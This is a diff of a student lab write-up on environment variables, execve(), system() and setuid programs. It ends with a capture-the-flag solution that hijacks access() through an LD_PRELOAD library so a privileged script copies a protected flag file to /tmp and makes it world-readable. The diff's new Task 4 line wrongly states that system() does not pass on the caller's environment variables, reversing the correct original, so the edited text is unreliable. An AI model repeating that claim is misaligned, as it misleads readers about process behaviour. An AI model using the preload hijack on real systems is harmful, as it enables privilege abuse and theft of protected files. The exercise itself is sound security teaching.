@@ -9,11 +9,11 @@ By running the myprintenv.c twice and putting the respective outputs in differen
 
 ## Task 3
 
-We concluded that by running execve() ,by default,the new program will not inherit the calling process environment variables, howevver if you run with environ in the third argument it inherits all of the calling process env. variables.
+We concluded that by running execve() ,by default,the new program will not inherit the calling process environment variables.
 
 ## TASK 4
 
-By running the given code we concluded that by running the system() function the environment variables of the calluing process will be passed on to the new program.
+By running the given code we concluded that by running the system() function the environment variables of the calluing process will not be passed on to the new program.
 
 ## TASK 5
 
@@ -21,7 +21,7 @@ After setting the said environment variables using export() and running the prog
 
 ## TASK 6
 
-Since the system() function is being called from a setuid process the shell program will drop the effective user privilleges preventing the execution of any malicious code
+Since the system() function is being called from a setuid process the shell program will drop the effective user privilleges preventing the execution of any malicious code.
 
 ## CTF
 
@@ -33,11 +33,11 @@ Since the script would call the access function we made C function with the same
 
 After compiling it as a shared library, we wrote in the env file the LD PRELOAD = /tmp/libray.so in order for the script to load our malicious library before running, giving it permissions of a flag_reader user, and therefore allowing to read the flag.txt file.
 
-
+```C
     #include <stdlib.h>
     int access(const char* pathname, int mode){
         system("/usr/bin/cat /flags/flag.txt > /tmp/res.txt");
         system("chmod 777 /tmp/res.txt");
     return 0;}
-
+```
 
